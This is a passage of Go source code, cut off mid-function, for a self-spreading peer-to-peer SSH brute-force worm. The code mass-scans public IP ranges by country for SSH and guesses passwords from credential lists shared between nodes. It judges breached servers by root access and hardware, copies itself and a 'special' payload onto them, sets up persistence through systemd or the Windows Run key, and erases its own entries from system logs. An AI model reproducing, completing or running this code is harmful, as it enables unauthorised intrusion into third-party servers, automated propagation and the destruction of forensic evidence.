package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ed25519"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/JustinTimperio/gomap"
	"github.com/libp2p/go-libp2p"
	kaddht "github.com/libp2p/go-libp2p-kad-dht"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multiaddr"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
	"golang.org/x/exp/mmap"
)

// ===================== Constants =====================
const (
	licenseFile    = "license.lic"
	identityFile   = "identity.enc"
	stateFile      = "state.enc"
	resultsFile    = "results.enc"
	errorLogFile   = "error.log"
	debugLogFile   = "debug.enc"
	blacklistFile  = "nonlinux.enc"

	devPubKeyHex   = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" // replace
	credBlockSize  = 30
	credLockTTL    = 10 * time.Second
)

var (
	devPubKey ed25519.PublicKey
	rng       = rand.New(rand.NewSource(time.Now().UnixNano()))

	// Flags
	verbose      bool
	testMode     bool
	devDebugMode bool

	portScanWorkers int
	authWorkers     int
	authRetries     int
	bruteWorkers    int
	scanTimeout     time.Duration
	phase2Timeout   time.Duration
	sshTimeout      time.Duration
	bruteDelay      time.Duration

	useSynScan bool
	synScanRate int
	synIface   string
	synMaxRTT  time.Duration
)

func init() {
	kb, _ := hex.DecodeString(devPubKeyHex)
	devPubKey = ed25519.PublicKey(kb)

	if _, err := os.Stat("debug.flag"); err == nil || os.Getenv("DEV_DEBUG") == "true" {
		devDebugMode = true
	}
}

// ===================== License =====================
type License struct {
	NodeID       string    `json:"node_id"`
	Expiry       time.Time `json:"expiry"`
	IssuedAt     time.Time `json:"issued_at"`
	SymmetricKey []byte    `json:"symmetric_key"`
	Signature    []byte    `json:"signature"`
}

func (l License) verify() bool {
	tmp := l
	tmp.Signature = nil
	data, _ := json.Marshal(tmp)
	return ed25519.Verify(devPubKey, data, l.Signature)
}

func loadAndVerifyLicense() (*License, error) {
	if testMode {
		log.Println("[TEST] Skipping license verification")
		return &License{
			NodeID:       "test-node",
			Expiry:       time.Now().Add(24 * time.Hour),
			IssuedAt:     time.Now(),
			SymmetricKey: bytes.Repeat([]byte{0x01}, 32),
		}, nil
	}
	data, err := os.ReadFile(licenseFile)
	if err != nil {
		return nil, fmt.Errorf("missing license: %w", err)
	}
	var lic License
	if err := json.Unmarshal(data, &lic); err != nil {
		return nil, fmt.Errorf("invalid license: %w", err)
	}
	if time.Now().After(lic.Expiry) {
		return nil, fmt.Errorf("license expired")
	}
	if !lic.verify() {
		return nil, fmt.Errorf("license signature invalid")
	}
	if len(lic.SymmetricKey) != 32 {
		return nil, fmt.Errorf("symmetric key must be 32 bytes")
	}
	return &lic, nil
}

// ===================== Crypto Helpers =====================
func encryptAES(plain, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plain, nil), nil
}

func decryptAES(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

func deriveKey(priv crypto.PrivKey) ([]byte, error) {
	raw, err := priv.Raw()
	if err != nil {
		return nil, err
	}
	h := sha256.Sum256(raw)
	return h[:], nil
}

func saveEncrypted(path string, data, key []byte) error {
	enc, err := encryptAES(data, key)
	if err != nil {
		return err
	}
	return os.WriteFile(path, enc, 0600)
}

func loadEncrypted(path string, key []byte) ([]byte, error) {
	enc, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return decryptAES(enc, key)
}

// ===================== Debug logging =====================
func (n *P2PNode) debugLog(format string, args ...interface{}) {
	if !devDebugMode {
		return
	}
	msg := fmt.Sprintf(format, args...)
	line := fmt.Sprintf("%s: %s\n", time.Now().Format(time.RFC3339), msg)
	enc, _ := encryptAES([]byte(line), n.symKey)
	f, _ := os.OpenFile(debugLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		f.Write(enc)
		f.Close()
	}
}

// ===================== ZIP helpers =====================
func extractZip(zipPath, dest string) error {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()
	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}
		path := filepath.Join(dest, f.Name)
		if f.FileInfo().IsDir() {
			os.MkdirAll(path, 0755)
			rc.Close()
			continue
		}
		os.MkdirAll(filepath.Dir(path), 0755)
		out, err := os.Create(path)
		if err != nil {
			rc.Close()
			return err
		}
		_, err = io.Copy(out, rc)
		out.Close()
		rc.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

func getCountryCodes(dir string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var codes []string
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".txt") {
			codes = append(codes, strings.TrimSuffix(e.Name(), ".txt"))
		}
	}
	return codes, nil
}

func loadCIDRs(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var cidrs []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" {
			cidrs = append(cidrs, l)
		}
	}
	return cidrs, sc.Err()
}

// ===================== IP helpers =====================
func expandCIDRFull(cidr string) ([]string, error) {
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	if _, bits := ipNet.Mask.Size(); bits != 32 {
		return nil, fmt.Errorf("IPv6 not supported")
	}
	start := ipNet.IP.Mask(ipNet.Mask)
	end := make(net.IP, len(start))
	copy(end, start)
	for i := range end {
		end[i] |= ^ipNet.Mask[i]
	}
	netAddr := start.String()
	bcast := end.String()
	ones, _ := ipNet.Mask.Size()
	var ips []string
	for ip := copyIP(start); ipNet.Contains(ip) && !ip.Equal(end); incIP(ip) {
		s := ip.String()
		if ones < 32 && s == netAddr {
			continue
		}
		if ones < 31 && s == bcast {
			continue
		}
		ips = append(ips, s)
	}
	return ips, nil
}

func copyIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func isPrivateIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	if ip.IsPrivate() {
		return true
	}
	if ip.IsLinkLocalUnicast() {
		return true
	}
	if ip.IsLoopback() {
		return true
	}
	privateBlocks := []string{
		"0.0.0.0/8",
		"169.254.0.0/16",
		"224.0.0.0/4",
		"240.0.0.0/4",
	}
	for _, block := range privateBlocks {
		_, cidr, _ := net.ParseCIDR(block)
		if cidr.Contains(ip) {
			return true
		}
	}
	return false
}

func scanPort(ip string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func isSSH(ip string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}
	return strings.HasPrefix(string(buf[:n]), "SSH-")
}

func supportsPasswordAuth(ip string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", ip, port)
	config := &ssh.ClientConfig{
		User:            "invalid_user",
		Auth:            []ssh.AuthMethod{ssh.Password("invalid_password")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	_, err := ssh.Dial("tcp", addr, config)
	if err == nil {
		return true
	}
	errStr := err.Error()
	lower := strings.ToLower(errStr)
	var opErr *net.OpError
	if errors.As(err, &opErr) {
		return false
	}
	if strings.Contains(lower, "no supported methods remain") {
		return strings.Contains(lower, "password")
	}
	if strings.Contains(lower, "permission denied") || strings.Contains(lower, "password authentication failed") {
		return true
	}
	return true
}

// ===================== SSH helpers =====================
func sshConnect(addr, user, pass string, timeout time.Duration) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, err
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		conn.Close()
		return nil, err
	}
	return ssh.NewClient(c, chans, reqs), nil
}

func runSSHCmd(client *ssh.Client, cmd string) (string, error) {
	sess, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer sess.Close()
	var out bytes.Buffer
	sess.Stdout = &out
	err = sess.Run(cmd)
	return strings.TrimSpace(out.String()), err
}

// ===================== SFTP helpers =====================
const (
	maxRetries  = 3
	baseBackoff = 1 * time.Second
	bufferSize  = 32 * 1024
)

func SFTPUploadWithRetry(client *ssh.Client, localPath, remotePath string) error {
	localInfo, err := os.Stat(localPath)
	if err != nil {
		return fmt.Errorf("stat local: %w", err)
	}
	localSize := localInfo.Size()
	localHash, err := fileSHA256(localPath)
	if err != nil {
		return fmt.Errorf("local checksum: %w", err)
	}
	var lastErr error
	for attempt := 1; attempt <= maxRetries; attempt++ {
		err := attemptUpload(client, localPath, remotePath, localSize, localHash)
		if err == nil {
			return nil
		}
		lastErr = err
		if !isRetryable(err) {
			return err
		}
		if attempt < maxRetries {
			backoff := baseBackoff * time.Duration(1<<(attempt-1))
			time.Sleep(backoff)
		}
	}
	return fmt.Errorf("upload failed after %d attempts: %w", maxRetries, lastErr)
}

func attemptUpload(client *ssh.Client, localPath, remotePath string, localSize int64, localHash []byte) error {
	sftpClient, err := sftp.NewClient(client)
	if err != nil {
		return fmt.Errorf("sftp init: %w", err)
	}
	defer sftpClient.Close()
	if err := sftpClient.MkdirAll(filepath.Dir(remotePath)); err != nil {
		return fmt.Errorf("mkdir: %w", err)
	}
	remoteFile, err := sftpClient.OpenFile(remotePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC)
	if err != nil {
		return fmt.Errorf("open remote: %w", err)
	}
	defer remoteFile.Close()
	localFile, err := os.Open(localPath)
	if err != nil {
		return fmt.Errorf("open local: %w", err)
	}
	defer localFile.Close()
	written, err := io.CopyBuffer(remoteFile, localFile, make([]byte, bufferSize))
	if err != nil {
		return fmt.Errorf("copy: %w", err)
	}
	if written != localSize {
		return fmt.Errorf("size mismatch: wrote %d, expected %d", written, localSize)
	}
	remoteHash, err := sftpFileSHA256(sftpClient, remotePath)
	if err != nil {
		return fmt.Errorf("remote checksum: %w", err)
	}
	if !bytes.Equal(localHash, remoteHash) {
		return fmt.Errorf("checksum mismatch after upload")
	}
	return nil
}

func SFTPUploadStreamWithSize(client *ssh.Client, reader io.Reader, remotePath string, size int64) error {
	sftpClient, err := sftp.NewClient(client)
	if err != nil {
		return fmt.Errorf("sftp init: %w", err)
	}
	defer sftpClient.Close()
	if err := sftpClient.MkdirAll(filepath.Dir(remotePath)); err != nil {
		return fmt.Errorf("mkdir: %w", err)
	}
	remoteFile, err := sftpClient.OpenFile(remotePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC)
	if err != nil {
		return fmt.Errorf("open remote: %w", err)
	}
	defer remoteFile.Close()
	written, err := io.CopyBuffer(remoteFile, reader, make([]byte, bufferSize))
	if err != nil {
		return fmt.Errorf("copy: %w", err)
	}
	if size > 0 && written != size {
		return fmt.Errorf("size mismatch: wrote %d, expected %d", written, size)
	}
	return nil
}

func fileSHA256(path string) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.CopyBuffer(h, f, make([]byte, bufferSize)); err != nil {
		return nil, err
	}
	return h.Sum(nil), nil
}

func sftpFileSHA256(client *sftp.Client, path string) ([]byte, error) {
	remote, err := client.Open(path)
	if err != nil {
		return nil, err
	}
	defer remote.Close()
	h := sha256.New()
	if _, err := io.CopyBuffer(h, remote, make([]byte, bufferSize)); err != nil {
		return nil, err
	}
	return h.Sum(nil), nil
}

func isRetryable(err error) bool {
	if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
		return false
	}
	var opErr *net.OpError
	if errors.As(err, &opErr) {
		return opErr.Temporary()
	}
	return true
}

// ===================== Credential mmap streaming =====================
type CredentialStreamer struct {
	reader *mmap.ReaderAt
	size   int64
	pos    int64
	mu     sync.Mutex
}

func newCredentialStreamer(path string) (*CredentialStreamer, error) {
	r, err := mmap.Open(path)
	if err != nil {
		return nil, err
	}
	info, err := os.Stat(path)
	if err != nil {
		r.Close()
		return nil, err
	}
	return &CredentialStreamer{
		reader: r,
		size:   info.Size(),
		pos:    0,
	}, nil
}

func (cs *CredentialStreamer) ReadBlock(blockSize int) ([]string, bool, error) {
	cs.mu.Lock()
	defer cs.mu.Unlock()
	if cs.pos >= cs.size {
		return nil, true, nil
	}
	var lines []string
	buf := make([]byte, 65536)
	for len(lines) < blockSize && cs.pos < cs.size {
		n, err := cs.reader.ReadAt(buf, cs.pos)
		if err != nil && err != io.EOF {
			return nil, false, err
		}
		data := string(buf[:n])
		lines = append(lines, strings.Split(data, "\n")...)
		cs.pos += int64(n)
	}
	if len(lines) > blockSize {
		lines = lines[:blockSize]
	}
	var result []string
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l != "" {
			result = append(result, l)
		}
	}
	return result, cs.pos >= cs.size, nil
}

func (cs *CredentialStreamer) Close() error {
	return cs.reader.Close()
}

// ===================== SYN scan using gomap =====================
// ===================== SYN scan using gomap (correct API) =====================
func fastSynScan(cidrs []string, rate int, iface string, timeout time.Duration) (map[string]struct{}, int) {
	log.Printf("[SYN] شروع اسکن SYN با کتابخانه gomap, تعداد شبکه: %d, حداکثر همزمانی: %d", len(cidrs), rate/100)

	openSet := make(map[string]struct{})
	var mu sync.Mutex
	var totalIPs int
	var wg sync.WaitGroup

	// کنترل همزمانی بر اساس نرخ (مثلاً rate/100 = حداکثر همزمانی)
	maxConcurrent := rate / 100
	if maxConcurrent < 1 {
		maxConcurrent = 10
	}
	if maxConcurrent > 500 {
		maxConcurrent = 500
	}
	sem := make(chan struct{}, maxConcurrent)

	for _, cidrStr := range cidrs {
		_, ipnet, err := net.ParseCIDR(cidrStr)
		if err != nil {
			log.Printf("[SYN] خطا در parsing CIDR %s: %v", cidrStr, err)
			continue
		}
		var ipsToScan []string
		for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
			ipStr := ip.String()
			if !isPrivateIP(ipStr) {
				ipsToScan = append(ipsToScan, ipStr)
				totalIPs++
			}
		}
		wg.Add(len(ipsToScan))
		for _, ip := range ipsToScan {
			go func(targetIP string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				// فراخوانی صحیح مطابق با مستندات:
				// ScanIP(ip, protocol, fastscan, syn)
				// fastscan = true (فقط پورت‌های رایج، شامل 22)
				// syn = true (اسکن SYN/Stealth)
				result, err := gomap.ScanIP(targetIP, "tcp", true, true)
				if err != nil {
					return
				}
				// بررسی خروجی متنی برای وجود پورت 22
				if strings.Contains(result.String(), "22") {
					mu.Lock()
					openSet[targetIP] = struct{}{}
					mu.Unlock()
					if verbose {
						log.Printf("[SYN] پورت 22 باز روی %s", targetIP)
					}
				}
			}(ip)
		}
	}
	wg.Wait()
	log.Printf("[SYN] اسکن پایان یافت. تعداد IPهای اسکن شده: %d, سرورهای SSH پیدا شده: %d", totalIPs, len(openSet))
	return openSet, totalIPs
}

func fastTCPConnectScan(cidrs []string, workers int, timeout time.Duration) (map[string]struct{}, int) {
	log.Printf("[TCP] شروع اسکن TCP با %d کارگر، تایم‌اوت=%v", workers, timeout)
	openSet := make(map[string]struct{})
	var allIPs []string
	for _, cidr := range cidrs {
		ips, _ := expandCIDRFull(cidr)
		for _, ip := range ips {
			if !isPrivateIP(ip) {
				allIPs = append(allIPs, ip)
			}
		}
	}
	totalIPs := len(allIPs)
	log.Printf("[TCP] تعداد کل IPها پس از حذف خصوصی: %d", totalIPs)

	jobCh := make(chan string, 10000)
	resultCh := make(chan string, 10000)
	var processed int64
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range jobCh {
				if scanPort(ip, 22, timeout) {
					resultCh <- ip
				}
				p := atomic.AddInt64(&processed, 1)
				if p%500 == 0 || p == int64(totalIPs) {
					log.Printf("[TCP] اسکن %d/%d IP, %d پورت باز", p, totalIPs, len(openSet))
				}
			}
		}()
	}
	go func() {
		for _, ip := range allIPs {
			jobCh <- ip
		}
		close(jobCh)
	}()
	done := make(chan struct{})
	go func() {
		for ip := range resultCh {
			openSet[ip] = struct{}{}
		}
		close(done)
	}()
	wg.Wait()
	close(resultCh)
	<-done
	log.Printf("[TCP] اسکن پایان یافت. پورت‌های باز: %d", len(openSet))
	return openSet, totalIPs
}

// ===================== Auto‑start persistence =====================
func setupAutoStart() error {
	execPath, _ := os.Executable()
	switch runtime.GOOS {
	case "linux":
		service := `[Unit]
Description=P2P SSH Cracker
After=network.target

[Service]
ExecStart=` + execPath + ` -v=false
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`
		err := os.WriteFile("/etc/systemd/system/p2p_cracker.service", []byte(service), 0644)
		if err != nil {
			return err
		}
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", "p2p_cracker.service").Run()
		return nil
	case "windows":
		key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		cmd := exec.Command("reg", "add", key, "/v", "P2PCracker", "/t", "REG_SZ", "/d", execPath, "/f")
		return cmd.Run()
	}
	return nil
}

// ===================== Linux‑only filter =====================
func isLinuxTarget(client *ssh.Client) bool {
	out, err := runSSHCmd(client, "uname -s")
	return err == nil && strings.TrimSpace(out) == "Linux"
}

func (n *P2PNode) isBlacklisted(ip string) bool {
	data, _ := loadEncrypted(blacklistFile, n.encKey)
	return strings.Contains(string(data), ip)
}

func (n *P2PNode) addToBlacklist(ip string) {
	f, _ := os.OpenFile(blacklistFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	defer f.Close()
	enc, _ := encryptAES([]byte(ip+"\n"), n.encKey)
	f.Write(enc)
}

// ===================== Log cleaning =====================
func cleanSystemLogs() {
	switch runtime.GOOS {
	case "linux":
		ip := getLocalIP()
		for _, file := range []string{"/var/log/auth.log", "/var/log/syslog", "/var/log/lastlog"} {
			exec.Command("sed", "-i", "/"+ip+"/d", file).Run()
		}
	case "windows":
		exec.Command("wevtutil", "cl", "Security", "/q:*.4625").Run()
	}
}

func getLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "127.0.0.1"
}

// ===================== Enhanced server evaluation =====================
type ServerInfo struct {
	RootAccess string
	CPUModel   string
	CPUCores   int
	RAM        string
	InternetOK bool
	Suitable   bool
}

func evaluateServer(client *ssh.Client, user, pass string) (ServerInfo, error) {
	info := ServerInfo{}
	if user == "root" {
		info.RootAccess = "direct"
	} else {
		if _, err := runSSHCmd(client, "sudo -n true"); err == nil {
			info.RootAccess = "sudo_nopass"
		} else {
			cmd := fmt.Sprintf("echo '%s' | sudo -S true", pass)
			if _, err := runSSHCmd(client, cmd); err == nil {
				info.RootAccess = "sudo_pass"
			} else {
				info.RootAccess = "none"
			}
		}
	}
	info.CPUModel, _ = runSSHCmd(client, `lscpu | grep 'Model name' | cut -d':' -f2 | xargs`)
	coresStr, _ := runSSHCmd(client, "nproc")
	if cores, err := strconv.Atoi(strings.TrimSpace(coresStr)); err == nil {
		info.CPUCores = cores
	}
	info.RAM, _ = runSSHCmd(client, `free -h | grep '^Mem:' | awk '{print $2}'`)
	urls := []string{
		"https://www.google.com",
		"https://fa.wikipedia.org",
		"http://archive.ubuntu.com",
		"https://github.com",
		"https://hub.docker.com",
		"https://www.npmjs.com",
	}
	for _, url := range urls {
		if testInternet(client, url) {
			info.InternetOK = true
			break
		}
	}
	if info.RootAccess != "none" && info.CPUCores > 0 && info.InternetOK {
		info.Suitable = true
	}
	return info, nil
}

func testInternet(client *ssh.Client, url string) bool {
	cmd := fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code}' --connect-timeout 5 %s", url)
	out, err := runSSHCmd(client, cmd)
	if err == nil {
		code := strings.TrimSpace(out)
		if code == "200" || code == "301" || code == "302" {
			return true
		}
	}
	domain := strings.TrimPrefix(strings.TrimPrefix(url, "https://"), "http://")
	domain = strings.Split(domain, "/")[0]
	cmd = fmt.Sprintf("ping -c 1 -W 3 %s", domain)
	_, err = runSSHCmd(client, cmd)
	return err == nil
}

// ===================== Deployment functions =====================
func deployNewNode(targetIP, user, pass string, node *P2PNode) error {
	if verbose {
		log.Printf("[DEPLOY] Deploying new node to %s", targetIP)
	}
	addr := fmt.Sprintf("%s:22", targetIP)
	client, err := sshConnect(addr, user, pass, 10*time.Second)
	if err != nil {
		return err
	}
	defer client.Close()
	peers := collectPeers(node)
	peersContent := strings.Join(peers, "\n")
	bin, _ := os.Executable()
	files := map[string]string{
		bin:             filepath.Base(bin),
		"ip_ranges.zip": "ip_ranges.zip",
		"creds.zip":     "creds.zip",
		"x.zip":         "x.zip",
	}
	for local, remote := range files {
		log.Printf("[DEPLOY] Uploading %s -> %s", local, remote)
		if err := SFTPUploadWithRetry(client, local, remote); err != nil {
			return fmt.Errorf("upload %s: %w", remote, err)
		}
	}
	encPeers, err := encryptAES([]byte(peersContent), node.symKey)
	if err != nil {
		return fmt.Errorf("encrypt peers.txt: %w", err)
	}
	peersReader := bytes.NewReader(encPeers)
	if err := SFTPUploadStreamWithSize(client, peersReader, "peers.txt", int64(len(encPeers))); err != nil {
		return fmt.Errorf("upload peers.txt: %w", err)
	}
	cmd := fmt.Sprintf("chmod +x %s && nohup ./%s >/dev/null 2>&1 &", filepath.Base(bin), filepath.Base(bin))
	log.Printf("[DEPLOY] Running: %s", cmd)
	_, err = runSSHCmd(client, cmd)
	return err
}

func deploySpecialTool(targetIP, user, pass, xDir string, node *P2PNode) error {
	if verbose {
		log.Printf("[DEPLOY] Deploying special tool to %s", targetIP)
	}
	addr := fmt.Sprintf("%s:22", targetIP)
	client, err := sshConnect(addr, user, pass, 10*time.Second)
	if err != nil {
		return err
	}
	defer client.Close()
	entries, err := os.ReadDir(xDir)
	if err != nil {
		return err
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		localPath := filepath.Join(xDir, e.Name())
		log.Printf("[DEPLOY] Uploading special file: %s", e.Name())
		if err := SFTPUploadWithRetry(client, localPath, e.Name()); err != nil {
			return fmt.Errorf("upload %s: %w", e.Name(), err)
		}
	}
	if _, err := os.Stat(filepath.Join(xDir, "special")); err == nil {
		cmd := "chmod +x special && ./special"
		log.Printf("[DEPLOY] Running special tool: %s", cmd)
		out, err := runSSHCmd(client, cmd)
		if err != nil {
			node.logError(fmt.Sprintf("special tool failed on %s: %v, output: %s", targetIP, err, out))
			return fmt.Errorf("run special tool: %w (output: %s)", err, out)
		}
		log.Printf("[DEPLOY] Special tool output: %s", out)
	}
	return nil
}

func collectPeers(node *P2PNode) []string {
	var lines []string
	for _, a := range node.host.Addrs() {
		lines = append(lines, fmt.Sprintf("%s/p2p/%s", a.String(), node.host.ID()))
	}
	for _, p := range node.host.Network().Peers() {
		info := node.host.Peerstore().PeerInfo(p)
		for _, a := range info.Addrs {
			lines = append(lines, fmt.Sprintf("%s/p2p/%s", a.String(), p))
		}
	}
	return lines
}

func (n *P2PNode) logError(msg string) {
	line := fmt.Sprintf("%s: %s\n", time.Now().Format(time.RFC3339), msg)
	enc, err := encryptAES([]byte(line), n.encKey)
	if err == nil {
		f, err := os.OpenFile(errorLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err == nil {
			f.Write(enc)
			f.Close()
		}
	}
	if verbose {
		log.Printf("[ERROR] %s", msg)
	}
}

// ===================== State =====================
type NodeState struct {
	Country    string   `json:"country"`
	ValidIPs   []string `json:"valid_ips"`
	CredOffset int      `json:"cred_offset"`
}

func (s *NodeState) save(encKey []byte) error {
	data, _ := json.Marshal(s)
	return saveEncrypted(stateFile, data, encKey)
}

func loadState(encKey []byte) (*NodeState, error) {
	data, err := loadEncrypted(stateFile, encKey)
	if err != nil {
		return nil, err
	}
	var s NodeState
	if err := json.Unmarshal(data, &s); err != nil {
		return nil, err
	}
	return &s, nil
}

// ===================== P2P Node =====================
type P2PNode struct {
	ctx    context.Context
	cancel context.CancelFunc

	host      host.Host
	dht       *kaddht.IpfsDHT
	ps        *pubsub.PubSub
	resTopic  *pubsub.Topic

	privKey crypto.PrivKey
	encKey  []byte
	symKey  []byte

	state   *NodeState
	stateMu sync.RWMutex

	// For test mode (no DHT)
	localCredOffsets sync.Map // country -> int (current offset)
	allCreds         []string // only used in test mode
	totalCreds       int

	// For production (mmap streaming)
	credStreamer *CredentialStreamer

	ipDir        string
	credsDir     string
	xDir         string
	countryCodes []string

	portScanWorkers int
	authWorkers     int
	authRetries     int
	bruteWorkers    int
	scanTimeout     time.Duration
	phase2Timeout   time.Duration
	sshTimeout      time.Duration
	bruteDelay      time.Duration

	jobCh      chan blockJob
	workerWg   sync.WaitGroup
	closeJobCh sync.Once

	dhtMu sync.Mutex
}

func (n *P2PNode) closeJobChannel() {
	n.closeJobCh.Do(func() { close(n.jobCh) })
}

type blockJob struct {
	ip, user, pass string
	wg             *sync.WaitGroup
	acc            *blockAccumulator
}

type blockAccumulator struct {
	mu sync.Mutex
	m  map[string][]bruteResult
}

type bruteResult struct {
	ip, user, pass string
}

// ===================== DHT helpers =====================
func (n *P2PNode) getValue(key string) ([]byte, error) {
	n.dhtMu.Lock()
	defer n.dhtMu.Unlock()
	ctx, cancel := context.WithTimeout(n.ctx, 10*time.Second)
	defer cancel()
	return n.dht.GetValue(ctx, key)
}

func (n *P2PNode) putValue(key string, val []byte) error {
	n.dhtMu.Lock()
	defer n.dhtMu.Unlock()
	ctx, cancel := context.WithTimeout(n.ctx, 10*time.Second)
	defer cancel()
	return n.dht.PutValue(ctx, key, val)
}

type lockEntry struct {
	NodeID string    `json:"nid"`
	Expiry time.Time `json:"exp"`
}

func (n *P2PNode) acquireCredLock(country string) (bool, error) {
	lockKey := "country:" + country + ":cred_lock"
	maxRetries := 20
	for i := 0; i < maxRetries; i++ {
		raw, err := n.getValue(lockKey)
		if err == nil && len(raw) > 0 {
			var le lockEntry
			if json.Unmarshal(raw, &le) == nil && time.Now().Before(le.Expiry) {
				if verbose && i == 0 {
					log.Printf("[LOCK] Cred lock for %s held by %s, retrying...", country, le.NodeID)
				}
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}
		le := lockEntry{NodeID: n.host.ID().String(), Expiry: time.Now().Add(credLockTTL)}
		data, _ := json.Marshal(le)
		if err := n.putValue(lockKey, data); err != nil {
			return false, err
		}
		raw2, err := n.getValue(lockKey)
		if err != nil {
			return false, err
		}
		var check lockEntry
		if json.Unmarshal(raw2, &check) == nil && check.NodeID == n.host.ID().String() {
			if verbose {
				log.Printf("[LOCK] Cred lock acquired for %s", country)
			}
			return true, nil
		}
		time.Sleep(50 * time.Millisecond)
	}
	if verbose {
		log.Printf("[LOCK] Failed to acquire cred lock for %s after %d attempts", country, maxRetries)
	}
	return false, fmt.Errorf("failed to acquire cred lock for %s after retries", country)
}

func (n *P2PNode) releaseCredLock(country string) {
	lockKey := "country:" + country + ":cred_lock"
	n.putValue(lockKey, []byte{})
	if verbose {
		log.Printf("[LOCK] Cred lock released for %s", country)
	}
}

func (n *P2PNode) getCredOffset(country string) (int, error) {
	key := "country:" + country + ":cred_offset"
	raw, err := n.getValue(key)
	if err != nil {
		return 0, nil
	}
	v, _ := strconv.Atoi(string(raw))
	return v, nil
}

func (n *P2PNode) setCredOffset(country string, off int) error {
	key := "country:" + country + ":cred_offset"
	return n.putValue(key, []byte(strconv.Itoa(off)))
}

// claimNextCredBlock handles both DHT (production) and local (test mode)
func (n *P2PNode) claimNextCredBlock(country string) ([]string, error) {
	if testMode {
		var off int
		if val, ok := n.localCredOffsets.Load(country); ok {
			off = val.(int)
		}
		if off >= n.totalCreds {
			return nil, nil
		}
		end := off + credBlockSize
		if end > n.totalCreds {
			end = n.totalCreds
		}
		block := n.allCreds[off:end]
		n.localCredOffsets.Store(country, end)
		if verbose {
